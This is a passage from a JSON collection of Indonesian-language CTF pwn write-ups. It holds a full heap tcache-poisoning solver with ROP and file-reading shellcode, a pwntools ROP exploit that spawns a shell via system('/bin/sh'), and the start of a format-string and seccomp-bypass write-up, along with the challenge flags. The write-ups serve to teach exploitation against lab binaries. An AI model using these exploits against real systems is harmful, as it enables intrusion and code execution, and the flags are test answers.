self.send(data + b\"\\n\")\r\n\r\n    def drain(self, timeout: float = 1.5) -> bytes:\r\n        return self.io.recvall(timeout=timeout)\r\n\r\n    def close(self) -> None:\r\n        try:\r\n            self.io.close()\r\n        except Exception:\r\n            pass\r\n\r\n\r\ndef run_cmd(args) -> str:\r\n    return subprocess.check_output(args, stderr=subprocess.DEVNULL).decode(\"latin-1\")\r\n\r\n\r\ndef resolve_binary() -> str:\r\n    if len(sys.argv) > 1:\r\n        path = sys.argv[1]\r\n    else:\r\n        path = next((p for p in DEFAULT_CANDIDATES if os.path.exists(p)), None)\r\n        if path is None:\r\n            raise SystemExit(\"Binary not found. Run: python3 solve.py ./challenge\")\r\n    path = os.path.abspath(path)\r\n    os.chmod(path, os.stat(path).st_mode | 0o111)\r\n    return path\r\n\r\n\r\ndef symbol_offset(path: str, symbol: str) -> int:\r\n    out = run_cmd([\"readelf\", \"-sW\", path])\r\n    for line in out.splitlines():\r\n        if re.search(rf\"\\b{re.escape(symbol)}@@\", line) or re.search(rf\"\\b{re.escape(symbol)}$\", line):\r\n            parts = line.split()\r\n            if len(parts) >= 2:\r\n                return int(parts[1], 16)\r\n    raise RuntimeError(f\"symbol {symbol} not found in {path}\")\r\n\r\n\r\ndef binary_text_symbol(binary: str, name_fragment: str) -> int:\r\n    out = run_cmd([\"nm\", \"-C\", binary])\r\n    for line in out.splitlines():\r\n        if name_fragment in line:\r\n            return int(line.split()[0], 16)\r\n    raise RuntimeError(f\"binary symbol containing {name_fragment!r} not found\")\r\n\r\n\r\ndef got_offset(binary: str, symbol: str) -> int:\r\n    out = run_cmd([\"readelf\", \"-rW\", binary])\r\n    for line in out.splitlines():\r\n        if f\"{symbol}@\" in line:\r\n            return int(line.split()[0], 16)\r\n    raise RuntimeError(f\"GOT relocation for {symbol} not found\")\r\n\r\n\r\ndef text_section(path: str):\r\n    out = run_cmd([\"readelf\", \"-SW\", path])\r\n    for line in out.splitlines():\r\n        if \" .text \" in line:\r\n            # [15] .text PROGBITS <addr> <off> <size> ...\r\n            parts = line.split()\r\n            addr = int(parts[3], 16)\r\n            off = int(parts[4], 16)\r\n            size = int(parts[5], 16)\r\n            return addr, off, size\r\n    raise RuntimeError(\".text section not found\")\r\n\r\n\r\ndef find_gadget(path: str, pattern: bytes) -> int:\r\n    vaddr, off, size = text_section(path)\r\n    data = open(path, \"rb\").read()\r\n    idx = data.find(pattern, off, off + size)\r\n    if idx < 0:\r\n        raise RuntimeError(f\"gadget {pattern.hex()} not found in {path}\")\r\n    return vaddr + (idx - off)\r\n\r\n\r\ndef protect_ptr(pos: int, ptr: int) -> int:\r\n    return (pos >> 12) ^ ptr\r\n\r\n\r\ndef decode_tcache_pair(encoded: int) -> int | None:\r\n    # We leak N1->fd where fd protects N2 and N2 == N1 + 0xc0.\r\n    # Usually encoded = N2 ^ (N2 >> 12). If the +0xc0 crosses a page,\r\n    # pos_page is one less than N2's page, so try both cases.\r\n    for carry in (0, 1):\r\n        y = encoded\r\n        for _ in range(32):\r\n            y = encoded ^ ((y >> 12) - carry)\r\n        n1 = y - USER_CHUNK_DELTA\r\n        if n1 % 0x10 == 0 and ((n1 >> 12) ^ (n1 + USER_CHUNK_DELTA)) == encoded:\r\n            return n1\r\n    return None\r\n\r\n\r\ndef no_newline(data: bytes, what: str) -> bytes:\r\n    # All writes through scanf(\"%[^\\n]\") must avoid literal newline bytes.\r\n    # ASLR makes pointer bytes vary, so the solver simply retries on unlucky runs.\r\n    if b\"\\n\" in data:\r\n        raise Retry(f\"newline byte in {what}\")\r\n    return data\r\n\r\n\r\ndef make_shellcode(mode: str, path: bytes = b\"./flag.txt\") -> bytes:\r\n    if mode == \"marker\":\r\n        sc = asm(\r\n            \"\"\"\r\n            mov edi, 1\r\n            lea rsi, [rip + msg]\r\n            mov edx, 8\r\n            mov eax, 1\r\n            syscall\r\n            xor edi, edi\r\n            mov eax, 60\r\n            syscall\r\n        msg:\r\n            .ascii \"SCOKOK!!\"\r\n            \"\"\"\r\n        )\r\n        return no_newline(sc, \"shellcode\")\r\n\r\n    if mode == \"ls\":\r\n        sc = asm(\r\n            \"\"\"\r\n            xor edi, edi\r\n            mov dil, 100\r\n            neg edi\r\n            lea rsi, [rip + path]\r\n            mov edx, 0x10000\r\n            xor r10d, r10d\r\n            mov eax, 257\r\n            syscall\r\n            mov edi, eax\r\n            lea rsi, [rip + buf]\r\n            mov edx, 0x400\r\n            mov eax, 217\r\n            syscall\r\n            mov edx, eax\r\n            mov edi, 1\r\n            lea rsi, [rip + buf]\r\n            mov eax, 1\r\n            syscall\r\n            xor edi, edi\r\n            mov eax, 60\r\n            syscall\r\n        path:\r\n            .ascii \".\"\r\n            .byte 0\r\n        buf:\r\n            \"\"\"\r\n        )\r\n        return no_newline(sc, \"shellcode\")\r\n\r\n    if mode == \"mmapfile\":\r\n        if b\"\\n\" in path or b\"\\x00\" in path:\r\n            raise ValueError(\"flag path must not contain newline or NUL\")\r\n        sc = asm(\r\n            f\"\"\"\r\n            xor edi, edi\r\n            mov dil, 100\r\n            neg edi\r\n            lea rsi, [rip + path]\r\n            xor edx, edx\r\n            xor r10d, r10d\r\n            mov eax, 257\r\n            syscall\r\n            mov r8, rax\r\n            mov edi, 0x13370000\r\n            mov esi, 0x1000\r\n            mov edx, 1\r\n            mov r10d, 2\r\n            xor r9d, r9d\r\n            mov eax, 9\r\n            syscall\r\n            mov edi, 1\r\n            mov rsi, rax\r\n            mov edx, 0x200\r\n            mov eax, 1\r\n            syscall\r\n            xor edi, edi\r\n            mov eax, 60\r\n            syscall\r\n        path:\r\n            .ascii \"{path.decode()}\"\r\n            .byte 0\r\n            \"\"\"\r\n        )\r\n        return no_newline(sc, \"shellcode\")\r\n\r\n    if b\"\\n\" in path or b\"\\x00\" in path:\r\n        raise ValueError(\"flag path must not contain newline or NUL\")\r\n\r\n    sc = asm(\r\n        f\"\"\"\r\n        xor edi, edi\r\n        mov dil, 100\r\n        neg edi\r\n        lea rsi, [rip + path]\r\n        xor edx, edx\r\n        xor r10d, r10d\r\n        mov eax, 257\r\n        syscall\r\n        mov edi, eax\r\n        lea rsi, [rip + buf]\r\n        mov edx, 0x200\r\n        xor eax, eax\r\n        syscall\r\n        mov edx, eax\r\n        mov edi, 1\r\n        lea rsi, [rip + buf]\r\n        mov eax, 1\r\n        syscall\r\n        xor edi, edi\r\n        mov eax, 60\r\n        syscall\r\n    path:\r\n        .ascii \"{path.decode()}\"\r\n        .byte 0\r\n    buf:\r\n        \"\"\"\r\n    )\r\n    return no_newline(sc, \"shellcode\")\r\n\r\n\r\ndef exploit_once(binary: str, info: dict, attempt: int, shellcode_mode: str, shellcode_path: bytes = b\"./flag.txt\") -> bytes:\r\n    tube = Tube()\r\n\r\n    def main_opt(n: int) -> None:\r\n        tube.recv_until(b\"Option> \")\r\n        tube.sendline(str(n))\r\n\r\n    def note_opt(n: int) -> None:\r\n        tube.recv_until(b\"Option> \")\r\n        tube.sendline(str(n))\r\n\r\n    def new_user(name: bytes = b\"Alice\") -> None:\r\n        main_opt(1)\r\n        tube.recv_until(b\"Your username: \")\r\n        tube.sendline(name)\r\n\r\n    def create_note(content: bytes | None = None) -> None:\r\n        main_opt(2)\r\n        if content is not None:\r\n            note_opt(2)\r\n            tube.recv_until(b\"New bet prediction: \")\r\n            tube.send(no_newline(content, \"note content\") + b\"\\n\")\r\n        note_opt(4)\r\n\r\n    def access_note(idx: int) -> None:\r\n        main_opt(3)\r\n        tube.recv_until(b\"Bet ID: \")\r\n        tube.sendline(str(idx))\r\n\r\n    def edit_current(payload: bytes) -> None:\r\n        note_opt(2)\r\n        tube.recv_until(b\"New bet prediction: \")\r\n        tube.send(no_newline(payload, \"edit payload\") + b\"\\n\")\r\n\r\n    def edit_note(idx: int, payload: bytes) -> None:\r\n        access_note(idx)\r\n        edit_current(payload)\r\n        note_opt(4)\r\n\r\n    def delete_note(idx: int) -> None:\r\n        access_note(idx)\r\n        note_opt(3)\r\n\r\n    def show_current() -> bytes:\r\n        note_opt(1)\r\n        out = tube.recv_until(b\"Option> \")\r\n        marker = out.find(b\"1) Show bet\")\r\n        if marker == -1:\r\n            marker = len(out)\r\n        return out[:marker].rstrip(b\"\\n\")\r\n\r\n    def show_note(idx: int) -> bytes:\r\n        access_note(idx)\r\n        leak = show_current()\r\n        # show_current already consumed the next note-menu prompt.\r\n        tube.sendline(\"4\")\r\n        return leak\r\n\r\n    try:\r\n        # Build three adjacent chunks. Deleting N2 then N1 keeps N1 accessible\r\n        # through the stale pointer and leaks N1->fd, which encodes N2.\r\n        new_user()\r\n        create_note(b\"A\" * 8)\r\n        create_note(b\"B\" * 8)\r\n        create_note(b\"C\" * 8)\r\n        delete_note(2)\r\n        delete_note(1)\r\n\r\n        heap_leak = show_note(1)\r\n        if len(heap_leak) < 6:\r\n            raise Retry(f\"short heap leak: {heap_leak.hex()}\")\r\n        n1 = decode_tcache_pair(u64(heap_leak[:6]))\r\n        if n1 is None:\r\n            raise Retry(f\"cannot decode heap leak: {heap_leak.hex()}\")\r\n\r\n        user = n1 - USER_CHUNK_DELTA\r\n        target = user - TARGET_BACK_OFFSET\r\n\r\n        # Tcache poison: first allocation returns N1, second returns target=user-0x40.\r\n        edit_note(1, p64(protect_ptr(n1, target)))\r\n        create_note(None)\r\n\r\n        # The fake chunk starts 0x40 bytes before the user object. Its constructor\r\n        # clears the pointer array but preserves callback/count. Rebuild enough of\r\n        # the pointer table so note 1 points at user->callback and note 3 points\r\n        # back to the fake chunk for repeated arbitrary writes.\r\n        main_opt(2)\r\n        edit_current(no_newline(b\"X\" * 0x40 + p64(user + 0x80) + p64(0) + p64(target), \"fake ptrs\"))\r\n        note_opt(4)\r\n\r\n        pie_leak = show_note(1)\r\n        if len(pie_leak) < 6:\r\n            raise Retry(f\"short PIE leak: {pie_leak.hex()}\")\r\n        callback = u64(pie_leak[:6])\r\n        pie_base = callback - info[\"print_user\"]\r\n        if pie_base & 0xfff or pie_base < 0x500000000000:\r\n            raise Retry(f\"bad PIE base: {pie_base:#x}\")\r\n\r\n        wip_feedback = pie_base + info[\"wip\"]\r\n        puts_got = pie_base + info[\"puts_got\"]\r\n\r\n        # Leak libc through puts@got.\r\n        edit_note(3, no_newline(b\"Y\" * 0x40 + p64(puts_got) + p64(0) + p64(target), \"puts got ptr\"))\r\n        libc_leak = show_note(1)\r\n        if len(libc_leak) < 6:\r\n            raise Retry(f\"short libc leak: {libc_leak.hex()}\")\r\n        puts_addr = u64(libc_leak[:6])\r\n        libc_base = puts_addr - info[\"libc_puts\"]\r\n        if libc_base & 0xfff or libc_base < 0x700000000000:\r\n            raise Retry(f\"bad libc base: {libc_base:#x}\")\r\n\r\n        pop_rdi = libc_base + info[\"pop_rdi\"]\r\n        pop_rsi = libc_base + info[\"pop_rsi\"]\r\n        pop_rdx = libc_base + info[\"pop_rdx\"]\r\n        ret = libc_base + info[\"ret\"]\r\n        mprotect = libc_base + info[\"mprotect\"]\r\n\r\n        shellcode = make_shellcode(shellcode_mode, shellcode_path)\r\n        shell_addr = (user + 0x800) & ~0xf\r\n        fake_rbp = (user + 0x600) & ~0xf\r\n        frame_base = fake_rbp - 0x50\r\n        heap_page = shell_addr & ~0xfff\r\n\r\n        # Write shellcode to heap.\r\n        edit_note(3, no_newline(b\"Z\" * 0x40 + p64(shell_addr) + p64(0) + p64(target), \"shell ptr\"))\r\n        edit_note(1, shellcode)\r\n\r\n        # Main epilogue after WIPFeedback will pivot to fake_rbp-0x10.\r\n        rop = b\"\".join(\r\n            p64(x)\r\n            for x in [\r\n                ret,\r\n                pop_rdi,\r\n                heap_page,\r\n                pop_rsi,\r\n                0x2000,\r\n                pop_rdx,\r\n                7,\r\n                mprotect,\r\n                shell_addr,\r\n            ]\r\n        )\r\n        frame = bytearray(b\"Q\" * 0x58 + rop)\r\n        frame[0x38:0x40] = p64(0)  # fake main local user pointer, harmless\r\n        frame[0x40:0x48] = p64(0)  # pop rbx\r\n        frame[0x48:0x50] = p64(0)  # pop r12\r\n        frame[0x50:0x58] = p64(0)  # pop rbp\r\n\r\n        edit_note(3, no_newline(b\"W\" * 0x40 + p64(frame_base) + p64(0) + p64(target), \"frame ptr\"))\r\n        edit_note(1, no_newline(bytes(frame), \"ROP frame\"))\r\n\r\n        # Change callback to WIPFeedback. It reads 0x48 bytes into a 0x40-byte\r\n        # stack buffer, so the last qword becomes main's rbp.\r\n        edit_note(3, no_newline(b\"V\" * 0x40 + p64(user + 0x80) + p64(0) + p64(target), \"callback ptr\"))\r\n        edit_note(1, no_newline(p64(wip_feedback), \"WIPFeedback address\"))\r\n\r\n        tube.recv_until(b\"Feedback: \", timeout=2.0)\r\n        tube.send(b\"A\" * 64 + p64(fake_rbp))\r\n        tube.recv_until(b\"Option> \", timeout=2.0)\r\n        tube.sendline(\"4\")\r\n\r\n        out = tube.drain(2.0)\r\n        tube.close()\r\n        return out\r\n    except Exception:\r\n        tube.close()\r\n        raise\r\n\r\n\r\ndef parse_dirents64(data: bytes) -> list[str]:\r\n    names = []\r\n    off = 0\r\n    while off + 19 <= len(data):\r\n        reclen = struct.unpack_from(\"<H\", data, off + 16)[0]\r\n        if reclen < 19 or off + reclen > len(data):\r\n            break\r\n        name_raw = data[off + 19:off + reclen].split(b\"\\x00\", 1)[0]\r\n        try:\r\n            name = name_raw.decode(\"utf-8\", errors=\"ignore\")\r\n        except Exception:\r\n            name = \"\"\r\n        if name:\r\n            names.append(name)\r\n        off += reclen\r\n    return names\r\n\r\n\r\ndef find_flag_name(entries: list[str]) -> str | None:\r\n    patterns = [\r\n        re.compile(r\"^flag[a-zA-Z0-9_{}.:-]*\\.txt$\"),\r\n        re.compile(r\"^flag[a-zA-Z0-9_{}.:-]*$\"),\r\n        re.compile(r\".*flag.*\", re.IGNORECASE),\r\n    ]\r\n    for pattern in patterns:\r\n        for entry in entries:\r\n            if pattern.fullmatch(entry) or pattern.search(entry):\r\n                return entry\r\n    return None\r\n\r\n\r\ndef main() -> None:\r\n    binary = resolve_binary()\r\n    libc = os.path.abspath(REMOTE_LIBC)\r\n    if not os.path.exists(libc):\r\n        raise SystemExit(f\"Remote libc not found: {libc}\")\r\n\r\n    info = {\r\n        \"print_user\": binary_text_symbol(binary, \"printUserNameFn\"),\r\n        \"wip\": binary_text_symbol(binary, \"WIPFeedback\"),\r\n        \"puts_got\": got_offset(binary, \"puts\"),\r\n        \"libc_puts\": symbol_offset(libc, \"puts\"),\r\n        \"mprotect\": symbol_offset(libc, \"mprotect\"),\r\n        \"ret\": find_gadget(libc, b\"\\xc3\"),\r\n        \"pop_rdi\": find_gadget(libc, b\"\\x5f\\xc3\"),\r\n        \"pop_rsi\": find_gadget(libc, b\"\\x5e\\xc3\"),\r\n        \"pop_rdx\": find_gadget(libc, b\"\\x5a\\xc3\"),\r\n    }\r\n\r\n    print(f\"[*] binary: {binary}\", file=sys.stderr)\r\n    print(f\"[*] libc:   {libc}\", file=sys.stderr)\r\n\r\n    debug_mode = os.environ.get(\"SC_MODE\")\r\n    debug_path = os.environ.get(\"FLAG_PATH\", \"./flag.txt\").encode()\r\n\r\n    if debug_mode:\r\n        last = b\"\"\r\n        for attempt in range(MAX_ATTEMPTS):\r\n            try:\r\n                out = exploit_once(binary, info, attempt, debug_mode, debug_path)\r\n                last = out\r\n                cleaned = out.replace(b\"\\x00\", b\"\")\r\n                if cleaned:\r\n                    sys.stdout.buffer.write(cleaned)\r\n                    if not cleaned.endswith(b\"\\n\"):\r\n                        sys.stdout.buffer.write(b\"\\n\")\r\n                    sys.stdout.flush()\r\n                if cleaned:\r\n                    return\r\n            except Retry as e:\r\n                print(f\"[*] retry {attempt}: {e}\", file=sys.stderr)\r\n                continue\r\n            except (BrokenPipeError, EOFError, OSError) as e:\r\n                print(f\"[*] retry {attempt}: process ended early ({e})\", file=sys.stderr)\r\n                continue\r\n        print(\"[-] exploit did not produce output\", file=sys.stderr)\r\n        if last:\r\n            print(last.hex(), file=sys.stderr)\r\n        raise SystemExit(1)\r\n\r\n    entries: list[str] = []\r\n    for attempt in range(MAX_ATTEMPTS):\r\n        try:\r\n            listing = exploit_once(binary, info, attempt, \"ls\")\r\n            entries = parse_dirents64(listing)\r\n            flag_name = find_flag_name(entries)\r\n            if flag_name:\r\n                break\r\n        except Retry as e:\r\n            print(f\"[*] retry list {attempt}: {e}\", file=sys.stderr)\r\n            continue\r\n        except (BrokenPipeError, EOFError, OSError) as e:\r\n            print(f\"[*] retry list {attempt}: process ended early ({e})\", file=sys.stderr)\r\n            continue\r\n    else:\r\n        print(\"[-] failed to enumerate remote directory\", file=sys.stderr)\r\n        if entries:\r\n            print(entries, file=sys.stderr)\r\n        raise SystemExit(1)\r\n\r\n    flag_path = f\"/{flag_name}\".encode()\r\n    print(f\"[*] flag file: {flag_name}\", file=sys.stderr)\r\n\r\n    last = b\"\"\r\n    for attempt in range(MAX_ATTEMPTS):\r\n        try:\r\n            out = exploit_once(binary, info, attempt, \"mmapfile\", flag_path)\r\n            last = out\r\n            cleaned = out.replace(b\"\\x00\", b\"\")\r\n            if cleaned:\r\n                sys.stdout.buffer.write(cleaned)\r\n                if not cleaned.endswith(b\"\\n\"):\r\n                    sys.stdout.buffer.write(b\"\\n\")\r\n                sys.stdout.flush()\r\n            if cleaned:\r\n                return\r\n        except Retry as e:\r\n            print(f\"[*] retry read {attempt}: {e}\", file=sys.stderr)\r\n            continue\r\n        except (BrokenPipeError, EOFError, OSError) as e:\r\n            print(f\"[*] retry read {attempt}: process ended early ({e})\", file=sys.stderr)\r\n            continue\r\n\r\n    print(\"[-] exploit did not produce output\", file=sys.stderr)\r\n    if last:\r\n        print(last.hex(), file=sys.stderr)\r\n    raise SystemExit(1)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "Untuk pembacaan file, mode paling stabil adalah:\n\n- `openat(AT_FDCWD, \"/flaguWSz45p3OjxUW3GaTTpV9VoHOREE5godifEBLjFMk.txt\", O_RDONLY, 0)`\n- `mmap(0x13370000, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0)`\n- `write(1, mapped, 0x200)`\n\nPendekatan `read` biasa sempat gagal pada beberapa attempt, tapi `mmap + write` stabil dan langsung mengeluarkan flag.",
    "lessonsLearned": ""
  },
  {
    "id": "ram-pwn-amorecomplicated",
    "title": "A More Complicated Example",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Challenge ini kelihatannya sederhana karena bug-nya cuma satu `read(0, buf, 0x80)` ke buffer stack 0x20 byte. Tapi bagian yang bikin agak nyebelin adalah gadget di binary hampir tidak ada. Tidak ada `pop rdi ; ret`, tidak ada `__libc_csu_init`, dan awalnya itu bikin ROP biasa kelihatan mentok.",
    "problemDescription": "Inti challenge ini bukan di bug stack overflow-nya, tapi di keterbatasan gadget. Kalau terpaku mencari `pop rdi ; ret`, challenge ini terasa lebih ribet dari yang sebenarnya. Begitu sadar `imul rdi, rax` bisa dipakai untuk:\n\n- men-zero-kan `rdi`\n- lalu membentuk `rdi` arbitrary\n\nROP-nya langsung jadi sederhana lagi: leak libc, balik ke `main`, lalu `system(\"/bin/sh\")`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Binary:\n\n- ELF 64-bit\n- No PIE\n- No Canary\n- NX enabled\n- Partial RELRO\n\nFungsi `main`:\n\n\n\nJadi offset RIP langsung:\n\n- `0x20` byte buffer\n- `0x08` saved RBP\n- total `0x28`",
        "code": "char buf[0x20];\nread(0, buf, 0x80);\nputs(\"LOOKS HUMAN MADE... SUSPICIOUS\");"
      },
      {
        "title": "Hal yang awalnya menipu",
        "content": "Gadget register yang paling kelihatan cuma ini:\n\n- `pop rax ; ret`\n- `inc rdi ; ret`\n- `imul rdi, rax ; ret`\n\nSekilas problemnya adalah kita tidak punya `pop rdi ; ret`, jadi susah buat manggil `puts(read@got)` atau `system(\"/bin/sh\")`.\n\nAwalnya saya sempat coba pivot ke `.bss`, bikin stage loader dari potongan `main`, lalu leak dari sana. Secara lokal itu sempat jalan, tapi di remote libc-nya lebih sensitif dan jalur leak itu gampang crash karena `puts` jalan di stack pivot buatan yang terlalu rapat.\n\nSolusi akhirnya jauh lebih bersih."
      },
      {
        "title": "Ide kunci",
        "content": "Walau kita tidak punya `pop rdi`, ternyata kita tetap bisa bikin `rdi = arbitrary` dengan gadget yang ada.\n\nTriknya:\n\n1. `pop rax ; ret` dengan nilai `0`\n2. `imul rdi, rax ; ret`\n\nKarena `rdi * 0 = 0`, sekarang `rdi` jadi nol.\n\nLalu:\n\n1. `inc rdi ; ret` membuat `rdi = 1`\n2. `pop rax ; ret` isi target\n3. `imul rdi, rax ; ret`\n\nKarena `1 * target = target`, akhirnya `rdi = target`.\n\nDengan itu, kita tidak perlu pivot aneh-aneh lagi. Kita bisa langsung ROP dari stack asli."
      },
      {
        "title": "Stage 1: leak libc",
        "content": "Payload pertama:\n\n\n\nEfeknya:\n\n- nolkan `rdi`\n- set `rdi = read@got`\n- panggil `puts(read@got)`\n- balik lagi ke `main`\n\nKarena binary non-PIE dan libc challenge disediakan, setelah dapat alamat `read`, base libc tinggal:",
        "code": "payload = flat(\n    b\"A\" * 0x28,\n    pop_rax, 0,\n    imul_rdi_rax,\n    inc_rdi,\n    pop_rax, elf.got[\"read\"],\n    imul_rdi_rax,\n    elf.plt[\"puts\"],\n    elf.sym[\"main\"],\n)"
      },
      {
        "title": "Stage 2: shell",
        "content": "Setelah balik ke `main`, kirim payload kedua.\n\nKarena read di binary cuma 0x80 byte, chain tahap dua harus pendek. `execve(\"/bin/sh\", 0, 0)` lewat gadget libc sebenarnya bisa, tapi chain-nya kepanjangan untuk budget payload yang tersedia.\n\nYang paling pas adalah `system(\"/bin/sh\")`:\n\n\n\n`ret` dipakai buat alignment stack sebelum masuk `system`.\n\nSetelah itu tinggal kirim command dari shell:",
        "code": "payload = flat(\n    b\"A\" * 0x28,\n    pop_rax, 0,\n    imul_rdi_rax,\n    inc_rdi,\n    pop_rax, libc_base + binsh,\n    imul_rdi_rax,\n    ret,\n    libc_base + libc.sym[\"system\"],\n)"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\ncontext.binary = elf = ELF(\"./chall\", checksec=False)\r\nlibc = ELF(\"./libc.so.6\", checksec=False)\r\ncontext.arch = \"amd64\"\r\n\r\nHOST = \"10.42.5.10\"\r\nPORT = 1337\r\n\r\nPOP_RAX = 0x40114A\r\nINC_RDI = 0x40114C\r\nIMUL_RDI_RAX = 0x401150\r\nRET = 0x401016\r\nOFFSET = 0x28\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n    return process(elf.path)\r\n\r\n\r\ndef set_rdi(value: int) -> bytes:\r\n    # rdi sesudah puts tidak berguna, jadi nolkan dulu lewat imul dengan 0.\r\n    chain = [\r\n        POP_RAX,\r\n        0,\r\n        IMUL_RDI_RAX,\r\n        INC_RDI,\r\n        POP_RAX,\r\n        value,\r\n        IMUL_RDI_RAX,\r\n    ]\r\n    return flat(chain, word_size=64)\r\n\r\n\r\ndef leak_payload() -> bytes:\r\n    chain = (\r\n        set_rdi(elf.got[\"read\"])\r\n        + flat(\r\n            elf.plt[\"puts\"],\r\n            elf.sym[\"main\"],\r\n            word_size=64,\r\n        )\r\n    )\r\n    return b\"A\" * OFFSET + chain\r\n\r\n\r\ndef shell_payload(libc_base: int) -> bytes:\r\n    bin_sh = libc_base + next(libc.search(b\"/bin/sh\\x00\"))\r\n    system = libc_base + libc.sym[\"system\"]\r\n    chain = set_rdi(bin_sh) + flat(RET, system, word_size=64)\r\n    return b\"A\" * OFFSET + chain\r\n\r\n\r\ndef main():\r\n    io = start()\r\n\r\n    io.recvuntil(b\"ENTER STRING:\\n\")\r\n    io.send(leak_payload())\r\n    io.recvline()\r\n    leak = u64(io.recvline().strip().ljust(8, b\"\\x00\"))\r\n    libc_base = leak - libc.sym[\"read\"]\r\n    log.success(f\"read@libc = {hex(leak)}\")\r\n    log.success(f\"libc base = {hex(libc_base)}\")\r\n\r\n    io.recvuntil(b\"ENTER STRING:\\n\")\r\n    io.send(shell_payload(libc_base))\r\n    io.interactive()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "RMCTF{63771n6_4_b17_h4rd3r}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-pwn-breakingarena",
    "title": "CTF — Breaking Arena",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "**Event:** RMCTF  \n**Category:** PWN  \n**Difficulty:** Medium  \n**Flag:** `RMCTF{AI-imitation}`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **Format String** | `printf(buf)` memungkinkan leak alamat stack dan code pointer |\n| 2 | **Stack Buffer Overflow** | `read(0, buf, 0x60)` ke buffer `0x40` memberi kontrol RIP |\n| 3 | **Executable Stack** | Shellcode bisa dijalankan langsung tanpa ROP rumit |\n| 4 | **Writable Seccomp Policy Source** | `filter.txt` dibaca dari filesystem setiap proses dan bisa ditimpa lewat syscall yang sudah diizinkan |\n| 5 | **Predictable Re-entry Primitive** | Satu-byte overwrite di saved RIP cukup untuk kembali memanggil `vuln()` |\n\n---",
    "tools": [
      "checksec",
      "objdump",
      "pwntools",
      "python",
      "nc"
    ],
    "analysis": "Ternyata flag tidak berada di `/flag.txt`. Saat mencoba beberapa path umum, hasilnya kosong.\n\nKarena `read` sudah berhasil di-whitelist, saya naikkan lagi whitelist menjadi:\n\n```text\n0\n1\n2\n60\n217\n231\n262\n```\n\nAngka `217` adalah syscall `getdents64`, yang bisa dipakai untuk listing direktori.\n\nDengan shellcode kecil:\n\n1. `open(\"/\", O_DIRECTORY)`\n2. `getdents64(fd, buf, 0x1000)`\n3. `write(1, buf, nbytes)`\n\nsaya bisa parse isi root filesystem remote.\n\nNama file yang menarik muncul di `/`:\n\n```text\nflagm5eJllzNN3E3DIBAmwuiWWDyWcqnsOpGz3pannFU.txt\n```\n\nJadi flag memang disimpan di root, tapi dengan nama acak panjang.",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> The Gibson has challenged people all over the world. It has claimed to be able to do anything we people can do and more. So far, it seems to have been right. Can you find a loophole in the competition and gain a competative edge over the Gibson?\n\n**Target:** `10.42.5.10:1337`\n\n---"
      },
      {
        "title": "Step 1 — Identify Binary Protections",
        "content": "Langkah pertama adalah cek tipe binary dan mitigasi yang aktif.\n\n\n\nHasil pentingnya:\n\n- `ELF 64-bit`, arsitektur `amd64`\n- `PIE enabled`\n- `No canary found`\n- `Stack executable`\n- `RWX segments`\n- Binary `not stripped`\n\nIni langsung menarik, karena kombinasi:\n\n- ada **format string**\n- ada **stack overflow**\n- stack **bisa dieksekusi**\n\nberarti shellcode kemungkinan jauh lebih simpel daripada ROP/ret2libc penuh.",
        "code": "file challenge\nchecksec --file=challenge"
      },
      {
        "title": "Step 2 — Observe Program Behavior",
        "content": "Saat dijalankan, program hanya meminta satu input:\n\n\n\nDari kalimat \"I'll do it right back\", saya curiga input akan dicetak balik memakai `printf(buf)` tanpa format string yang aman.\n\n---",
        "code": "Welcome to the Breaking arena! Gonna start you off with a simple competition. You make a move, and I'll do it right back!\nGive us your move:"
      },
      {
        "title": "Step 3 — Inspect `main()` and `vuln()`",
        "content": "Disassembly fungsi `vuln()` menunjukkan bug utama:\n\n\n\nPadahal buffer di stack hanya `0x40` byte. Artinya ada dua primitive sekaligus:\n\n- **Format string vulnerability** karena `printf(buf)`\n- **Stack buffer overflow** karena `read()` membaca `0x60` byte ke buffer `0x40`\n\nOffset stack-nya juga enak:\n\n- buffer mulai di `[rbp-0x40]`\n- saved RIP berada `0x48` byte dari awal buffer\n\nJadi payload 72 byte sudah cukup untuk overwrite RIP.",
        "code": "read(0, buf, 0x60);\nprintf(buf);"
      },
      {
        "title": "Step 4 — Analyze the Seccomp Filter",
        "content": "Di `main()`, binary memuat daftar syscall yang diizinkan dari `./filter.txt`.\n\nIsi awal file:\n\n\n\nKalau diterjemahkan:\n\n- `1`  -> `write`\n- `2`  -> `open`\n- `60` -> `exit`\n- `231` -> `exit_group`\n- `262` -> `newfstatat`\n\nYang penting: **`read(0, ...)` tidak diizinkan setelah seccomp aktif**. Itu menjelaskan kenapa exploit biasa untuk ORW langsung gagal. Kita butuh jalan memutar.\n\n---",
        "code": "1\n2\n60\n231\n262"
      },
      {
        "title": "Step 5 — Leak Stack Address and Re-enter `vuln()`",
        "content": "Karena ada format string, saya pakai payload untuk leak:\n\n- alamat buffer stack\n- alamat return ke `main+0x13a7`\n\nPayload leak:\n\n\n\nIdenya:\n\n- `%1$p` leak pointer stack yang kebetulan menunjuk ke buffer\n- `%15$p` leak return address di dalam binary\n- byte terakhir `\\xa7` mengubah low byte saved RIP agar return ke `main+0x13a7`, yaitu call `vuln()` lagi\n\nJadi satu input memberi dua hasil:\n\n1. dapat alamat stack untuk shellcode\n2. program masuk lagi ke `vuln()` sehingga kita bisa kirim payload tahap berikutnya",
        "code": "(b\"%1$p.%15$p\\n\\x00\").ljust(72, b\"A\") + b\"\\xa7\""
      },
      {
        "title": "Step 6 — Abuse Executable Stack",
